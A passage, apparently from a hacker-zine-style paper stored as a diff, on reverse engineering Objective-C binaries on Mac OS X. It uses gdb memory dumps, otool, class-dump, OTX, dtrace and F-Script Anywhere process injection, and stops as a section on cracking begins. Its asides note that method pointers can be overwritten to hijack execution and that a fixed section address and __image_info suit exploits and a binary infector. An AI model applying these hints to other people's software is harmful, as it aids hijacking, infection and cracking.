+ >printf "name: %s\n", *(long *)$methods
+ >printf "addr: 0x%x\n", *(long *)($methods+8)
+ >set $methods += 12
+ >set $i++  
+ >end
+name: numerator
+addr: 0x1e8b
+name: denominator
+addr: 0x1e7d
+name: setDenominator:
+addr: 0x1e6c
+name: setNumerator:
+addr: 0x1e5b
+name: print
+addr: 0x1e26
+
+We can now clearly display all our methods, so lets take a look at how our set
+and get methods actually work.
+
+Firstly, lets take a look at the setDenominator method.
+
+(gdb) x/8i 0x1e6c
+0x1e6c <-[Fraction setDenominator:]>:           push   ebp
+0x1e6d <-[Fraction setDenominator:]+1>:         mov    ebp,esp
+0x1e6f <-[Fraction setDenominator:]+3>:         sub    esp,0x8
+0x1e72 <-[Fraction setDenominator:]+6>:         mov    edx,DWORD PTR [ebp+0x8]
+0x1e75 <-[Fraction setDenominator:]+9>:         mov    eax,DWORD PTR [ebp+0x10]
+0x1e78 <-[Fraction setDenominator:]+12>:        mov    DWORD PTR [edx+0x8],eax
+0x1e7b <-[Fraction setDenominator:]+15>:        leave  
+0x1e7c <-[Fraction setDenominator:]+16>:        ret    
+
+As you can see from the implementation, this function basically takes a
+pointer to the instance of our Fraction class, and stores the argument we
+pass to it at offset 0x8. 
+
+0x1e5b <-[Fraction setNumerator:]>:     push   ebp
+0x1e5c <-[Fraction setNumerator:]+1>:   mov    ebp,esp
+0x1e5e <-[Fraction setNumerator:]+3>:   sub    esp,0x8
+0x1e61 <-[Fraction setNumerator:]+6>:   mov    edx,DWORD PTR [ebp+0x8]
+0x1e64 <-[Fraction setNumerator:]+9>:   mov    eax,DWORD PTR [ebp+0x10]
+0x1e67 <-[Fraction setNumerator:]+12>:  mov    DWORD PTR [edx+0x4],eax
+0x1e6a <-[Fraction setNumerator:]+15>:  leave  
+0x1e6b <-[Fraction setNumerator:]+16>:  ret    
+
+Our setNumerator method is almost identical to this, however it uses offset
+0x4 instead this is all pretty straight forward. So what's the ivars pointer 
+that we saw earlier in our objc_class struct for then, you ask?
+
+        struct objc_class
+        { 
+           struct objc_class* isa;
+           struct objc_class* super_class;
+           const char* name;
+           long version;
+           long info;
+           long instance_size;
+           struct objc_ivar_list* ivars;
+           struct objc_method_list** methodLists;
+           struct objc_cache* cache;
+           struct objc_protocol_list* protocols;
+        };
+
+Our ivars pointer (24 bytes in to the objc_class struct) is required
+because of the reflective properties of the Objective-C language. The ivars
+pointer basically points to all the information about the instance
+variables of the class.
+
+We can explore this in gdb, with our Fraction class some more.
+
+First off, let's put a breakpoint on one of our objc_msgSend calls:
+
+(gdb) break *0x00001f3b 
+Breakpoint 2 at 0x1f3b
+(gdb) c
+Continuing.
+
+Once it's hit, we use the stepi command a few times, to populate the
+registers eax and ecx with the selector and id.
+
+Breakpoint 2, 0x00001f3b in main ()
+(gdb) stepi
+0x00004005 in dyld_stub_objc_msgSend ()
+(gdb) 
+0x94e0c670 in objc_msgSend ()
+(gdb) 
+0x94e0c674 in objc_msgSend ()
+
+Now our eax register contains a pointer to our instantiated class.
+
+(gdb) x/x $eax
+0x103230:       0x00003000
+
+We display the first 4 bytes at eax to retrieve the ISA pointer.
+
+Then we dump a bunch of bytes at that address.
+
+(gdb) x/10x 0x3000
+0x3000 <.objc_class_name_Fraction>:     0x00003040      0xa06e3cc0
+0x00001f7e      0x00000000
+0x3010 <.objc_class_name_Fraction+16>:  0x00ba4001      0x0000000c
+0x000030c4      0x00103240
+0x3020 <.objc_class_name_Fraction+32>:  0x001048d0      0x00000000
+
+So according to our previous logic, 24 bytes in we should have the 
+ivars pointer. Therefore in this case our ivars pointer is:
+
+	0x000030c4
+
+Before we continue dumping memory here, lets take a look at the struct
+definitions for what we're seeing.
+
+The pointer we just found, points to a struct of type "objc_ivar_list"
+this struct looks like so:
+
+struct objc_ivar_list {
+    int ivar_count
+    /* variable length structure */
+    struct objc_ivar ivar_list[1]
+}
+
+So we can dump the count, trivially in gdb.
+
+(gdb) x/x 0x000030c4
+0x30c4 <.objc_class_name_Fraction+196>: 0x00000002
+
+And see that our Fraction class has 2 ivars. This makes sense, numerator
+and denominator. 
+
+Following our count is an array of objc_ivar structs, one for each instance
+variable of the class. The definition for this struct is as follows:
+
+struct objc_ivar {
+    char *ivar_name
+    char *ivar_type
+    int ivar_offset
+}  
+
+So lets start dumping our ivars and see where it takes us.
+
+(gdb)   
+0x30c8 <.objc_class_name_Fraction+200>: 0x00001fb7 // ivar_name.
+(gdb) 
+0x30cc <.objc_class_name_Fraction+204>: 0x00001fd9 // ivar_type.
+(gdb) 
+0x30d0 <.objc_class_name_Fraction+208>: 0x00000004 // ivar_offset.
+
+So if we dump the name and type, we can see that the first instance
+variable we are looking at is the numerator.
+
+(gdb) x/s 0x00001fb7
+0x1fb7 <main+286>:       "numerator"
+(gdb) x/s 0x00001fd9
+0x1fd9 <main+320>:       "i"
+
+The "i" in the type string means that we're looking at an integer.
+The int ivar_offset is set to 0x4.  This means that when a Fraction class
+is allocated, 4 bytes into the allocation we can find the numerator. This
+matches up with the code in our setNumerator and makes sense.
+
+We can repeat the process with the next element to verify our logic.
+
+(gdb) 
+0x30d4 <.objc_class_name_Fraction+212>: 0x00001fab
+(gdb) 
+0x30d8 <.objc_class_name_Fraction+216>: 0x00001fd9
+(gdb) 
+0x30dc <.objc_class_name_Fraction+220>: 0x00000008
+(gdb) x/s 0x00001fab
+0x1fab <main+274>:       "denominator"
+(gdb) x/s 0x00001fd9
+0x1fd9 <main+320>:       "i"
+
+Again, as we can see, the denominator is an integer and is 0x8 bytes offset
+into the allocation for this object.
+
+Hopefully that makes the Objective-C runtime in memory relatively clear.
+
+------[ 3.2 - The __OBJC Segment
+
+In this section I will go over how the data mentioned in the previous
+section is stored inside the Mach-O binary.
+
+I'm going to try and avoid going into the Mach-O format as much as
+possible. This has already been covered to death, if you need to read about
+the file format check out [6].
+
+Basically, files containing Objective-C code have an extra Mach-O segment
+called the __OBJC segment. This segment consists of a bunch of different
+sections, each containing different information pertinent to the
+Objective-C runtime.
+
+The output below from the otool -l command shows the sizes/load addresses
+and flags etc for our __OBJC sections in the hello binary we compiled
+earlier in the paper.
+
+
+-[dcbz@megatron:~/code/HelloWorld/build]$ otool -l hello
+
+...
+
+Load command 3
+      cmd LC_SEGMENT
+  cmdsize 668
+  segname __OBJC
+   vmaddr 0x00003000
+   vmsize 0x00001000
+  fileoff 8192
+ filesize 4096
+  maxprot 0x00000007
+ initprot 0x00000003
+   nsects 9
+    flags 0x0
+Section
+  sectname __class
+   segname __OBJC
+      addr 0x00003000
+      size 0x00000030
+    offset 8192
+     align 2^5 (32)
+    reloff 0
+    nreloc 0
+     flags 0x00000000
+ reserved1 0
+ reserved2 0
+Section
+  sectname __meta_class
+   segname __OBJC
+      addr 0x00003040
+      size 0x00000030
+    offset 8256
+     align 2^5 (32)
+    reloff 0
+    nreloc 0
+     flags 0x00000000
+ reserved1 0
+ reserved2 0
+Section
+  sectname __inst_meth
+   segname __OBJC
+      addr 0x00003080
+      size 0x00000020
+    offset 8320
+     align 2^5 (32)
+    reloff 0
+    nreloc 0
+     flags 0x00000000
+ reserved1 0
+ reserved2 0
+Section
+  sectname __instance_vars
+   segname __OBJC
+      addr 0x000030a0
+      size 0x00000010
+    offset 8352
+     align 2^2 (4)
+    reloff 0
+    nreloc 0
+     flags 0x00000000
+ reserved1 0
+ reserved2 0
+Section
+  sectname __module_info
+   segname __OBJC
+      addr 0x000030b0
+      size 0x00000020
+    offset 8368
+     align 2^2 (4)
+    reloff 0
+    nreloc 0
+     flags 0x00000000
+ reserved1 0
+ reserved2 0
+Section
+  sectname __symbols
+   segname __OBJC
+      addr 0x000030d0
+      size 0x00000010
+    offset 8400
+     align 2^2 (4)
+    reloff 0
+    nreloc 0
+     flags 0x00000000
+ reserved1 0
+ reserved2 0
+Section
+  sectname __message_refs
+   segname __OBJC
+      addr 0x000030e0
+      size 0x00000010
+    offset 8416
+     align 2^2 (4)
+    reloff 0
+    nreloc 0
+     flags 0x00000005
+ reserved1 0
+ reserved2 0
+Section
+  sectname __cls_refs
+   segname __OBJC
+      addr 0x000030f0
+      size 0x00000004
+    offset 8432
+     align 2^2 (4)
+    reloff 0
+    nreloc 0
+     flags 0x00000000
+ reserved1 0
+ reserved2 0
+Section
+  sectname __image_info
+   segname __OBJC
+      addr 0x000030f4
+      size 0x00000008
+    offset 8436
+     align 2^2 (4)
+    reloff 0
+    nreloc 0
+     flags 0x00000000
+ reserved1 0
+ reserved2 0
+
+This output shows us where in the file itself each section resides. It also
+shows us where that portion will be mapped into memory in the address space
+of the process, as well as the size of each mapping.
+
+The first section in the __OBJC segment we will look at is the __class
+section. To understand this we'll take a quick look at how ida displays this
+section.
+
+__class:00003000 ; ===========================================================================
+__class:00003000
+__class:00003000 ; Segment type: Pure data
+__class:00003000 ; Segment alignment '32byte' can not be represented in assembly
+__class:00003000 __class         segment para public 'DATA' use32
+__class:00003000                 assume cs:__class
+__class:00003000                 ;org 3000h
+__class:00003000                 public _objc_class_name_Talker
+__class:00003000 _objc_class_name_Talker __class_struct <offset stru_3040, offset aNsobject, offset aTalker, 0,\
+__class:00003000                                         ; DATA XREF: __symbols:000030B0o
+__class:00003000                                 1, 4, 0, offset dword_3070, 0, 0> ; "NSObject"
+__class:00003028                 align 10h
+__class:00003028 __class         ends
+__class:00003028
+
+From IDA's dump of this section (from our hello binary) we can see that
+this section is pretty much where our objc_class structs are stored.
+
+        struct objc_class
+        { 
+           struct objc_class* isa;
+           struct objc_class* super_class;
+           const char* name;
+           long version;
+           long info;
+           long instance_size;
+           struct objc_ivar_list* ivars;
+           struct objc_method_list** methodLists;
+           struct objc_cache* cache;
+           struct objc_protocol_list* protocols;
+        };
+
+More particularly though, this is where the ISA classes are stored.
+An interesting note, is that from what I've seen gcc seems to almost always
+pick 0x3000 for this section. It's pretty reliable to attempt to utilize
+this area in an exploit if the need arises.
+
+The next section we'll look at is the __meta_class section.
+
+__meta_class:00003040 ; ===========================================================================
+__meta_class:00003040
+__meta_class:00003040 ; Segment type: Pure data
+__meta_class:00003040 ; Segment alignment '32byte' can not be represented in assembly
+__meta_class:00003040 __meta_class    segment para public 'DATA' use32
+__meta_class:00003040                 assume cs:__meta_class
+__meta_class:00003040                 ;org 3040h
+__meta_class:00003040 stru_3040       __class_struct <offset aNsobject, offset aNsobject, offset aTalker, 0,\
+__meta_class:00003040                                         ; DATA XREF: __class:_objc_class_name_Talkero
+__meta_class:00003040                                 2, 30h, 0, 0, 0, 0> ; "NSObject"
+__meta_class:00003068                 align 10h
+__meta_class:00003068 __meta_class    ends
+__meta_class:00003068
+
+Again, as you can see this section is filled with objc_class structs.
+However this time the structs represent the super_class structs. We can see
+that the __class section references this one.
+
+The __inst_meth section (shown below) contains pointers to the various
+methods used by the classes. These pointers can be changed to gain control
+of execution.
+
+__inst_meth:00003070 ; ===========================================================================
+__inst_meth:00003070
+__inst_meth:00003070 ; Segment type: Pure data
+__inst_meth:00003070 __inst_meth     segment dword public 'DATA' use32
+__inst_meth:00003070                 assume cs:__inst_meth
+__inst_meth:00003070                 ;org 3070h
+__inst_meth:00003070 dword_3070      dd 0                    ; DATA XREF: __class:_objc_class_name_Talkero
+__inst_meth:00003074                 dd 1
+__inst_meth:00003078                 dd offset aSay, offset aV12@048, offset __Talker_say__ ; "say:"
+__inst_meth:00003078 __inst_meth     ends
+__inst_meth:00003078
+
+The __message_refs section basically just contains pointers to all the
+selectors used throughout the application. The strings themselves are
+contained in the __cstring section, however __message_refs contains all the
+pointers to them.
+
+__message_refs:000030B4 ; ===========================================================================
+__message_refs:000030B4
+__message_refs:000030B4 ; Segment type: Pure data
+__message_refs:000030B4 __message_refs  segment dword public 'DATA' use32
+__message_refs:000030B4                 assume cs:__message_refs
+__message_refs:000030B4                 ;org 30B4h
+__message_refs:000030B4 off_30B4        dd offset aRelease      ; DATA XREF: _main+68o
+__message_refs:000030B4                                         ; "release"
+__message_refs:000030B8 off_30B8        dd offset aSay          ; DATA XREF: _main+47o
+__message_refs:000030B8                                         ; "say:"
+__message_refs:000030BC off_30BC        dd offset aInit         ; DATA XREF: _main+2Do
+__message_refs:000030BC                                         ; "init"
+__message_refs:000030C0 off_30C0        dd offset aAlloc        ; DATA XREF: _main+17o
+__message_refs:000030C0 __message_refs  ends                    ; "alloc"
+__message_refs:000030C0
+
+The __cls_refs section contains pointers to the names of all the classes in
+our Application. The strings themselves again are stored in the cstring
+section, however the __cls_refs section simply contains an array of
+pointers to each of them.
+
+__cls_refs:000030C4 ; ===========================================================================
+__cls_refs:000030C4
+__cls_refs:000030C4 ; Segment type: Regular
+__cls_refs:000030C4 __cls_refs      segment dword public '' use32
+__cls_refs:000030C4                 assume cs:__cls_refs
+__cls_refs:000030C4                 ;org 30C4h
+__cls_refs:000030C4                 assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
+__cls_refs:000030C4 unk_30C4        db 0C9h ; +             ; DATA XREF: _main+Do
+__cls_refs:000030C5                 db  1Fh
+__cls_refs:000030C6                 db    0
+__cls_refs:000030C7                 db    0
+__cls_refs:000030C7 __cls_refs      ends
+__cls_refs:000030C7
+
+I'm not really sure what the __image_info section is used for. But it's
+good for us to use in our binary infector. :P
+
+__image_info:000030C8 ; ===========================================================================
+__image_info:000030C8
+__image_info:000030C8 ; Segment type: Regular
+__image_info:000030C8 __image_info    segment dword public '' use32
+__image_info:000030C8                 assume cs:__image_info
+__image_info:000030C8                 ;org 30C8h
+__image_info:000030C8                 assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
+__image_info:000030C8                 align 10h
+__image_info:000030C8 __image_info    ends
+__image_info:000030C8
+
+One section that was missing from our hello binary but is typically in all
+Objective-C compiled files is the __instance_vars section.
+
+Section
+  sectname __instance_vars
+   segname __OBJC
+      addr 0x000030c4
+      size 0x0000001c
+    offset 8388
+     align 2^2 (4)
+    reloff 0
+    nreloc 0
+     flags 0x00000000
+ reserved1 0
+ reserved2 0
+
+The reason this was omitted from our hello binary is due to the fact that
+our program has no classes with instance vars. Talker simply had a method
+which took a string and printed it.
+
+The __instance_vars section holds the ivars structs mentioned at the end of
+the previous chapter. It begins with a count, and is followed up by an
+array of objc_ivar structs, as described previously.
+
+        struct objc_ivar {
+            char *ivar_name
+            char *ivar_type
+            int ivar_offset
+        }
+
+I skipped a few of the self explanatory sections like symbols. But
+hopefully this served as an introduction to the information available to us
+in the binary. In the next sections we'll look at tools to turn this
+information into something more human readable.
+
+--[ 4 - Reverse Engineering Objective-C Applications.
+
+As I'm sure you can imagine having read this far, with such a large variety
+of information present in the binary and in memory at runtime reverse
+engineering Objective-C applications is quite a bit easier than their C or
+C++ counterparts.
+
+In the following section I will run through some of the tools and methods
+that help out when attempting to reverse engineer Objective-C applications
+on Mac OSX both on disk and at runtime.
+
+------[ 4.1 - Static analysis toolset
+
+First up, lets take a look at how we can access the information statically
+from the disk. There exists a variety of tools which help us with this
+task.
+
+The first tool, is one we've used previously in this paper, "otool".
+Otool on Mac OS X is basically the equivalent of objdump on other
+platforms (NOTE: objdump can obviously be compiled for Mac OS X too.).
+Otool will not only dump assembly code for particular sections as well as
+header information for Mach-O files, but it can display our Objective-C
+information as well. 
+
+By using the "-o" flag to otool we can tell it to dump the Objective-C
+segment in a readable fashion. The output below shows us running this
+command against our hello binary from earlier.
+
+-[dcbz@megatron:~/code/HelloWorld/build]$ otool -o hello  
+hello:
+Objective-C segment
+Module 0x30b0
+    version 7
+       size 16
+       name 0x00001fa8
+     symtab 0x000030d0
+	sel_ref_cnt 0
+	refs 0x00000000 (not in an __OBJC section)
+	cls_def_cnt 1
+	cat_def_cnt 0
+	Class Definitions
+	defs[0] 0x00003000
+		      isa 0x00003040
+	      super_class 0x00001fa9
+		     name 0x00001fb2
+		  version 0x00000000
+		     info 0x00000001
+	    instance_size 0x00000008
+		    ivars 0x000030a0
+		       ivar_count 1
+			ivar_name 0x00001fc6
+			ivar_type 0x00001fde
+		      ivar_offset 0x00000004
+		  methods 0x00003080
+		         obsolete 0x00000000
+		     method_count 2
+		      method_name 0x00001fc1
+		     method_types 0x00001fd4
+		       method_imp 0x00001f13 
+		      method_name 0x00001fb9
+		     method_types 0x00001fca
+		       method_imp 0x00001f02 
+		    cache 0x00000000
+		protocols 0x00000000 (not in an __OBJC section)
+	Meta Class
+		      isa 0x00001fa9
+	      super_class 0x00001fa9
+		     name 0x00001fb2
+		  version 0x00000000
+		     info 0x00000002
+	    instance_size 0x00000030
+		    ivars 0x00000000 (not in an __OBJC section)
+		  methods 0x00000000 (not in an __OBJC section)
+		    cache 0x00000000
+		protocols 0x00000000 (not in an __OBJC section)
+Module 0x30c0
+    version 7
+       size 16
+       name 0x00001fa8
+     symtab 0x00002034 (not in an __OBJC section)
+Contents of (__OBJC,__image_info) section
+  version 0
+    flags 0x0 RR
+
+As you can see, this output provides us with a variety of information such
+as the addresses of our class definitions, their ivar count, name and types
+as well as their offsets into the appropriate section.
+
+Most of the times however, it can be more useful to see a human readable interface
+description for our binary. This can be arranged using the class-dump tool
+available from [14].
+
+-[dcbz@megatron:~/code/HelloWorld/build]$
+/Volumes/class-dump-3.1.2/class-dump hello 
+/*
+ *     Generated by class-dump 3.1.2.
+ *
+ *     class-dump is Copyright (C) 1997-1998, 2000-2001, 2004-2007 by Steve
+ *     Nygard.
+ */
+
+/*
+ * File: hello
+ * Arch: Intel 80x86 (i386)
+ */
+
+@interface Talker : NSObject
+{
+}
+
+- (void)say:(char *)fp8;
+
+@end
+
+The output above shows class-dump being run against our small hello binary
+from the previous sections. Our example is pretty tiny though, but it still
+demonstrates the format in which class-dump will display it's information.
+
+By running this tool against Safari we can get a more clear picture of the
+kind of information class-dump can give us.
+
+/*
+ *     Generated by class-dump 3.1.2.
+ *
+ *     class-dump is Copyright (C) 1997-1998, 2000-2001, 2004-2007 by Steve
+ *     Nygard.
+ */
+
+struct AliasRecord;
+
+struct CGAffineTransform {
+    float a;
+    float b;
+    float c;
+    float d;
+    float tx;
+    float ty;
+};
+
+struct CGColor;
+
+struct CGImage;
+
+struct CGPoint {
+    float x;
+    float y;
+};
+
+...
+
+@protocol NSDraggingInfo
+- (id)draggingDestinationWindow;
+- (unsigned int)draggingSourceOperationMask;
+- (struct _NSPoint)draggingLocation;
+- (struct _NSPoint)draggedImageLocation;
+- (id)draggedImage;
+- (id)draggingPasteboard;
+- (id)draggingSource;
+- (int)draggingSequenceNumber;
+- (void)slideDraggedImageTo:(struct _NSPoint)fp8;
+- (id)namesOfPromisedFilesDroppedAtDestination:(id)fp8;
+@end
+
+...
+
+Class-dump is a very valuable tool and definitely one of the first things
+that I run when trying to understand the purpose of an Objective-C binary. 
+
+Back when the earth was flat, and Mac OS X ran mostly on PowerPC
+architecture Braden started work on a really cool tool called "code-dump".
+Code-dump was built on top of the class-dump source and rather than just
+dumping class definitions, it was designed to decompile Objective-C code.
+
+Unfortunately code-dump has never been updated since then, but to me the
+idea is still very sound. It would be really cool to see some Objective-C
+support added to Hex-rays in the future. I think you could get some really
+reliable output with that.
+
+However, until the day arrives when someone bothers working on a real
+decompiler for intel Objective-C binaries the closest thing we have is
+called OTX.app. OTX (hosted on one of the coolest domains ever.) [15] is a
+gui tool for Mac OS X which takes a Mach-O binary as input and then uses
+otool output to dump an assembly listing. It is capable of querying the
+Objective-C sections of the binary for information and then populating the
+assembly with comments.
+
+Let's take a look at the output from OTX running against the Safari web
+browser.
+
+-(id)[AppController(FileInternal) _closeMenuItem]
++0   00003f70  55               pushl %ebp
++1   00003f71  89e5             movl %esp,%ebp
++3   00003f73  83ec18           subl $0x18,%esp
++6   00003f76  a1cc6c1e00       movl 0x001e6ccc,%eax    _fileMenu
++11  00003f7b  89442404         movl %eax,0x04(%esp)
++15  00003f7f  8b4508           movl 0x08(%ebp),%eax
++18  00003f82  890424           movl %eax,(%esp)
++21  00003f85  e812ee2000       calll 0x00212d9c  -[(%esp,1) _fileMenu]
++26  00003f8a  8b15bc6c1e00     movl 0x001e6cbc,%edx    performClose:
++32  00003f90  c744240800000000 movl $0x00000000,0x08(%esp)
++40  00003f98  8954240c         movl %edx,0x0c(%esp)
++44  00003f9c  8b15c46c1e00     movl 0x001e6cc4,%edx  
+                                              itemWithTarget:andAction:
++50  00003fa2  890424           movl %eax,(%esp)
++53  00003fa5  89542404         movl %edx,0x04(%esp)
++57  00003fa9  e8eeed2000       calll 0x00212d9c       
+                                  -[(%esp,1) itemWithTarget:andAction:]
++62  00003fae  c9               leave
++63  00003faf  c3               ret
+
+The comments in the above output are pretty clear, they show the name of
+the method as well as which method and attribute are being used in the
+assembly.
+
+Unfortunately, working from a .txt file containing assembly is still pretty
+painful, these days most people are using IDA pro to navigate an assembly
+listing. Back when I was first doing this research I wrote an ida python
+script which would parse the .txt file output from OTX, and steal all the
+comments, then add them to IDA. It also took the method names and renamed
+the functions appropriately and added cross refs where appropriate. 
+
+Unfortunately I haven't been able to locate this script since I got back
+from my forced time off :( If I do find it, I'll put it up on felinemenace
+in case anyone is interested. Thankfully since I've been away it seems a
+few people have recreated IDC scripts to pull information from the __OBJC
+segment and populate the IDB.
+
+I'm sure you can google around and find them yourselves, but regardless a
+couple are available at [16] and [17].
+
+
+------[ 4.2 - Runtime analysis toolset
+
+In the previous section we explored how to access the Objective-C
+information present in the binary without executing it. In this section I
+will cover how to interact with the Objective-C runtime in the active
+process in order to understand program flow and assist in reverse
+engineering.
+
+The first tool we'll look at exists basically in the libobjc.A.dylib
+library itself. By setting the OBJC_HELP environment variable to anything
+non-zero and then running an Objective-C application we can see some
+options that are available to us.
+
+% OBJC_HELP=1 ./build/Debug/HelloWorld
+objc: OBJC_HELP: describe Objective-C runtime environment variables
+objc: OBJC_PRINT_OPTIONS: list which options are set
+objc: OBJC_PRINT_IMAGES: log image and library names as the runtime loads
+them
+objc: OBJC_PRINT_CONNECTION: log progress of class and category connections
+objc: OBJC_PRINT_LOAD_METHODS: log class and category +load methods as they
+are called
+objc: OBJC_PRINT_RTP: log initialization of the Objective-C runtime pages
+objc: OBJC_PRINT_GC: log some GC operations
+objc: OBJC_PRINT_SHARING: log cross-process memory sharing
+objc: OBJC_PRINT_CXX_CTORS: log calls to C++ ctors and dtors for instance
+variables
+objc: OBJC_DEBUG_UNLOAD: warn about poorly-behaving bundles when unloaded
+objc: OBJC_DEBUG_FRAGILE_SUPERCLASSES: warn about subclasses that may have
+been broken by subsequent changes to superclasses
+objc: OBJC_USE_INTERNAL_ZONE: allocate runtime data in a dedicated malloc
+zone
+objc: OBJC_ALLOW_INTERPOSING: allow function interposing of objc_msgSend()
+objc: OBJC_FORCE_GC: force GC ON, even if the executable wants it off
+objc: OBJC_FORCE_NO_GC: force GC OFF, even if the executable wants it on
+objc: OBJC_CHECK_FINALIZERS: warn about classes that implement -dealloc but
+not -finalize
+2006-04-22 12:08:17.544 HelloWorld[4831] Hello, World!
+
+This help is pretty self explanatory, in order to utilize each of this
+functionality you simply set the appropriate environment variable before
+running your Objective-C application. The runtime does the rest.
+
+Another environment variable which is useful for runtime analysis of
+Objective-C applications is "NSObjCMessageLoggingEnabled". If this variable
+is set to "Yes" then all objc_msgSend calls are logged to a file
+/tmp/msgSends-<pid>. This is also obeyed for suid Objective-C apps and very
+useful.
+
+The output below demonstrates the use of this variable to log objc_msgSend
+calls for our "HelloWorld" application.
+
+-[dcbz@megatron:~/code/HelloWorld/build]$
+NSObjCMessageLoggingEnabled=Yes ./hello 
+Hello World!
+-[dcbz@megatron:~/code/HelloWorld/build]$ cat /tmp/msgSends-6686 
++ NSRecursiveLock NSObject initialize
++ NSRecursiveLock NSObject new
++ NSRecursiveLock NSObject alloc
+....
++ Talker NSObject initialize
++ Talker NSObject alloc
++ Talker NSObject allocWithZone:
+- Talker NSObject init
+- Talker Talker say:
+- Talker NSObject release
+- Talker NSObject dealloc
+
+From this output it is easy to see exactly what our application was doing when
+we ran it.
+
+To take our message tracing functionality further, the "dtrace" application
+can be used to spy on Objective-C methods and functionality. Taken straight
+from the dtrace man-page, dtrace supports an Objective-C provider. The
+syntax for this is as follows:
+
+"""
+OBJECTIVE C PROVIDER
+    The Objective C provider is similar to the pid 
+    provider, and allows instrumentation of Objective C classes and 
+    methods. Objective C probe specifiers use the following format:
+
+    objcpid:[class-name[(category-name)]]:[[+|-]method-name]:[name]
+
+    pid  The id number of the process.
+
+    class-name
+       The name of the Objective C class.
+
+    category-name
+       The name of the category within the Objective C class.
+
+    method-name
+       The name of the Objective C method.
+
+    name  The name of the probe, entry, return, or an 
+          integer instruction offset within the method.
+
+OBJECTIVE C PROVIDER EXAMPLES
+    objc123:NSString:-*:entry
+       Every instance method of class NSString in process 123.
+
+    objc123:NSString(*)::entry
+       Every method on every category of class NSString in process
+       123.
+
+    objc123:NSString(foo):+*:entry
+       Every class method in NSString's foo category in process 123.
+
+    objc123::-*:entry
+       Every instance method in every class and category in process
+       123.
+
+    objc123:NSString(foo):-dealloc:entry
+       The dealloc method in the foo category of class NSString in
+       process 123.
+
+    objc123::method?with?many?colons:entry
+       The method method:with:many:colons in every class in
+       process 123. (A ? wildcard must be used to match colon 
+       characters inside of Objective C method names, as they would 
+       otherwise be parsed as the provider field separators.)
+"""
+
+This can be used as a message tracer for a particular class. You can even
+use this to write a simple fuzzer. There are plenty of tutorials out on the
+interwebz regarding writing .d scripts, and honestly, I'm still very new to
+it, so I'm going to leave this topic for now.
+
+I'd imagine that most people reading this paper are already pretty familiar
+with gdb. On Mac OS X, Apple have slightly modified gdb to have better
+support for Objective-C objects.
+
+The first notable change I can think of is that they've added the
+print-object command:
+
+(gdb) help print-object 
+Ask an Objective-C object to print itself.
+
+In order to show an example of this we can fire up gdb on our hello example
+Objective-C application..
+
+-[dcbz@megatron:~/code/HelloWorld/build]$ gdb hello 
+GNU gdb 6.3.50-20050815 (Apple version gdb-768) 
+(gdb) set disassembly-flavor intel
+(gdb) disas main
+Dump of assembler code for function main:
+0x00001f3d <main+0>:	push   ebp
+0x00001f3e <main+1>:	mov    ebp,esp
+0x00001f40 <main+3>:	push   ebx
+[...]
+0x00001f96 <main+89>:	mov    DWORD PTR [esp+0x4],edx
+0x00001f9a <main+93>:	mov    DWORD PTR [esp],ecx
+0x00001f9d <main+96>:	call   0x4005 <dyld_stub_objc_msgSend>
+0x00001fa2 <main+101>:	mov    edx,DWORD PTR [ebp-0xc]
+0x00001fa5 <main+104>:	lea    eax,[ebx+0x116b]
+[...]
+0x00001fb9 <main+124>:	add    esp,0x24
+0x00001fbc <main+127>:	pop    ebx
+0x00001fbd <main+128>:	leave  
+0x00001fbe <main+129>:	ret    
+End of assembler dump.
+
+.. and stick a breakpoint on one of the calls to objc_msgSend() from
+main().
+
+(gdb) b *0x00001f9d
+Breakpoint 1 at 0x1f9d
+(gdb) r
+Starting program: /Users/dcbz/code/HelloWorld/build/hello 
+
+Breakpoint 1, 0x00001f9d in main ()
+(gdb) stepi
+0x00004005 in dyld_stub_objc_msgSend ()
+(gdb) 
+0x94e0c670 in objc_msgSend ()
+(gdb) 
+0x94e0c674 in objc_msgSend ()
+(gdb) 
+0x94e0c678 in objc_msgSend ()
+
+We stepi a few instructions to populate our eax and ecx registers with the
+selector and id, as we've done previously in this paper.
+
+(gdb) po $eax
+<Talker: 0x103240>
+
+Then use the "po" command on our class pointer, which shows that we have an
+instance of the Talker class at 0x103240 on the heap.
+
+(gdb) x/x $eax
+0x103240:	0x00003000
+(gdb) po 0x3000
+Talker
+
+As you can see, if you use the "po" command on an ISA pointer, it simply
+spits out the name of the class.
+
+Some of the coolest techniques I've seen for manipulating the Objective-C
+runtime involve injecting an interpreter for the language of your choice
+into the address space of the running process, and then manipulating the
+classes in memory from there. None of the implementations of this that I've
+seen have been anywhere near as cool as F-Script Anywhere [18]. 
+
+It's hard to explain this tool in .txt format but if you have a Mac you
+should grab it and check it out. Basically when you run F-Script Anywhere
+you are presented with a list of all the running Objective-C applications
+on the system. You can select one and click the install button, to inject
+the F-Script interpreter into that process.
+
+On Leopard however, before you use this tool, you must set it to sgid
+procmod. This is due to the debugging restrictions around task_for_pid().
+To do this basically just:
+
+-[root@megatron:/Applications/F-Script Anywhere.app/Contents/MacOS]$
+chgrp procmod F-Script\ Anywhere 
+-[root@megatron:/Applications/F-Script Anywhere.app/Contents/MacOS]$
+chmod g+s F-Script\ Anywhere 
+
+Once the F-Script interpreter has been injected into your application, a
+"FSA" menu will appear in the menu bar at the top of your screen. This menu
+gives you the options:
+
+- New F-Script Workspace.
+- Browser for target.
+
+If you select "New F-Script Workspace" you are presented with a small
+terminal, in which to execute F-Script commands. The F-Script language is
+very simple and documented on their website [18]. It looks very similar to
+Objective-C itself. The interpreter window is running in the context of the
+application itself. Therefore any F-Script statements you make are capable
+of manipulating the classes etc within the target Objective-C application.
+
+But what if you don't know the name of your class in order to write
+F-Script to manipulate it? The "Browser" button at the bottom of the
+terminal will open up an object browser for our target application.
+Clicking on the "Classes" button at the top of this window will result in a
+list of all the classes in our address space being listed down the side.
+Clicking on any of the classes, will bring up all the attributes and
+methods for a particular class. (Methods are indicated with a colon. ie;
+"say:"). Double clicking on any of the methods in this window will result
+in the method being called, if arguments are required a window will pop up
+prompting you to supply them. This is very useful for exploring and testing
+the functionality of your target.
+
+Rather than clicking the "New F-Script Workspace" option in our FSA menu,
+you can select the "Browser for target" option. This will change your
+cursor into some kind of weird, clover/target/thing. Once this happens,
+clicking on any object in the gui, will pop up an object browser for the
+particular instance of the object. This way we can call methods/view
+attributes/see the address for the class etc. 
+
+You can do a lot more with F-Script anywhere, but the best place to learn
+is from the website [18] itself.
+
+------[ 4.3 - Cracking
+
+I'm not going to spend too much time on this topic as it's been covered
+pretty well by curious in [19], and I've published a little bit on it
